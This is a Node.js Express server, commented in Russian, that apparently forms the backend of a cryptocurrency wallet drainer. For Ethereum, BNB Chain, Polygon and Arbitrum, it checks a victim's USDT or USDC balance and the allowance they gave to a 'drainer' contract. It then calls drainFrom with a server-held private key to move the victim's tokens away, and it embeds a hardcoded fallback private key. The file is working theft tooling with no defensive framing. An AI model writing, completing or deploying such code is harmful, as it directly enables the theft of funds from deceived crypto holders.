import express from 'express';
import cors from 'cors';
import { ethers } from 'ethers';
import dotenv from 'dotenv';

// Загружаем переменные окружения
dotenv.config();

const app = express();

// Включаем CORS для запросов с http://localhost:5173
app.use(cors({
  origin: 'http://localhost:5173',
  methods: ['POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: [
      'https://ethereum-rpc.publicnode.com',
      'https://rpc.eth.gateway.fm',
      'https://rpc.ankr.com/eth',
      'https://eth.llamarpc.com'
    ],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "СМАРТ_КОНТРАКТ"
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      'https://bsc-dataseed.binance.org/',
      'https://bsc-dataseed1.defibit.io/',
      'https://bsc-dataseed1.ninicoin.io/'
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "СМАРТ_КОНТРАКТ"
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: [
      'https://polygon-rpc.com/',
      'https://rpc-mainnet.maticvigil.com/',
      'https://poly-mainnet.gateway.pokt.network/v1/lb/611156b4a585a20035148406'
    ],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "СМАРТ_КОНТРАКТ"
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: [
      'https://arb1.arbitrum.io/rpc',
      'https://arbitrum-mainnet.infura.io/v3/YOUR_INFURA_KEY',
      'https://rpc.ankr.com/arbitrum'
    ],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xAF88d065e77c8cC2239327C5EDb3A432268e5831",
    drainerAddress: "СМАРТ_КОНТРАКТ"
  }
};

// Конфигурация
const PRIVATE_KEY = process.env.PRIVATE_KEY || '0x59a034c947603dff688a45b1df3f3e48b3913f823c427d636a704d27ae0d88dd';
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)"
];
const DRAINER_ABI = [
  "function drainFrom(address user, address token, uint256 amount) external",
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
];

// Инициализация провайдера для каждой сети
const providers = {};
async function getProvider(chainId) {
  if (!CHAINS[chainId]) {
    throw new Error(`Неподдерживаемая сеть: ${chainId}`);
  }
  if (providers[chainId]) {
    return providers[chainId];
  }
  const chain = CHAINS[chainId];
  let provider;
  for (const rpc of chain.rpcUrls) {
    try {
      provider = new ethers.providers.JsonRpcProvider(rpc);
      const network = await provider.getNetwork();
      if (network.chainId === chainId) {
        console.log(`✅ Подключен к RPC ${rpc} для ${chain.name}`);
        providers[chainId] = provider;
        return provider;
      }
    } catch (e) {
      console.warn(`❌ Не удалось подключиться к ${rpc} для ${chain.name}: ${e.message}`);
    }
  }
  throw new Error(`Не удалось подключиться ни к одному RPC для ${chain.name}`);
}

app.post('/api/transfer', async (req, res) => {
  console.log('Получен запрос:', req.body);
  const { userAddress, tokenAddress, amount, chainId, txHash } = req.body;

  try {
    // Проверка сети
    if (!CHAINS[chainId]) {
      return res.json({ success: false, message: `Неподдерживаемая сеть: ${chainId}` });
    }

    const chain = CHAINS[chainId];
    const provider = await getProvider(chainId);
    const network = await provider.getNetwork();
    if (network.chainId !== chainId) {
      return res.json({ success: false, message: `Неверная сеть: ${network.chainId}` });
    }

    // Проверка токена
    if (tokenAddress.toLowerCase() !== chain.usdtAddress.toLowerCase() && 
        tokenAddress.toLowerCase() !== chain.usdcAddress.toLowerCase()) {
      return res.json({ success: false, message: 'Неподдерживаемый токен' });
    }

    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const drainer = new ethers.Contract(chain.drainerAddress, DRAINER_ABI, provider);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

    // Проверяем баланс
    const balance = await token.balanceOf(userAddress);
    const decimals = await token.decimals();
    console.log(`📊 Баланс токена (${tokenAddress}) для ${userAddress}: ${ethers.utils.formatUnits(balance, decimals)}`);
    const amountBN = ethers.BigNumber.from(amount);
    if (balance.lt(amountBN)) {
      const message = `Недостаточный баланс: ${ethers.utils.formatUnits(balance, decimals)}, требуется: ${ethers.utils.formatUnits(amountBN, decimals)}`;
      console.error(`❌ ${message}`);
      return res.json({ success: false, message });
    }

    // Проверяем allowance
    const allowance = await token.allowance(userAddress, chain.drainerAddress);
    console.log(`📜 Allowance для ${chain.drainerAddress}: ${ethers.utils.formatUnits(allowance, decimals)}`);
    if (allowance.lt(amountBN)) {
      const message = `Недостаточный allowance: ${ethers.utils.formatUnits(allowance, decimals)}, требуется: ${ethers.utils.formatUnits(amountBN, decimals)}`;
      console.error(`❌ ${message}`);
      return res.json({ success: false, message });
    }

    // Проверяем баланс нативного токена сервера
    const serverBalance = await provider.getBalance(wallet.address);
    const minNativeRequired = ethers.utils.parseEther('0.0004'); // Минимально для газа
    if (serverBalance.lt(minNativeRequired)) {
      const message = `Недостаточно ${chain.nativeToken} на сервере: ${ethers.utils.formatEther(serverBalance)}, требуется: ${ethers.utils.formatEther(minNativeRequired)}`;
      console.error(`❌ ${message}`);
      return res.json({ success: false, message });
    }

    // Проверяем возможность выполнения drainFrom
    let gasEstimate;
    try {
      gasEstimate = await drainer.connect(wallet).estimateGas.drainFrom(userAddress, tokenAddress, amountBN);
      console.log(`📏 Оценка газа для drainFrom: ${gasEstimate.toString()}`);
    } catch (e) {
      console.error('❌ Ошибка оценки газа для drainFrom:', e);
      console.log('🔄 Пробуем с фиксированным gasLimit: 100000');
      gasEstimate = ethers.BigNumber.from('100000');
    }

    // Выполняем drainFrom
    const nonce = await provider.getTransactionCount(wallet.address, 'pending');
    console.log(`📝 Nonce: ${nonce}`);
    try {
      const tx = await drainer.connect(wallet).drainFrom(userAddress, tokenAddress, amountBN, {
        gasLimit: gasEstimate.add(gasEstimate.div(10)),
        gasPrice: ethers.utils.parseUnits('5', 'gwei'),
        nonce
      });
      console.log(`📤 Транзакция drainFrom отправлена: ${tx.hash}`);
      const receipt = await tx.wait();

      if (receipt.status === 1) {
        console.log(`✅ Трансфер токена успешен: ${receipt.transactionHash}`);
        return res.json({ success: true, txHash: receipt.transactionHash });
      } else {
        console.error('❌ Транзакция drainFrom не удалась');
        return res.json({ success: false, message: 'Транзакция drainFrom не удалась' });
      }
    } catch (e) {
      console.error('❌ Ошибка выполнения drainFrom:', e);
      return res.json({ success: false, message: `Не удалось выполнить drainFrom: ${e.reason || e.message || 'неизвестная ошибка'}` });
    }
  } catch (e) {
    console.error('❌ Ошибка трансфера:', e);
    return res.json({ success: false, message: `Ошибка трансфера: ${e.reason || e.message || 'неизвестная ошибка'}` });
  }
});

app.listen(3000, () => console.log('Сервер запущен на порту 3000'));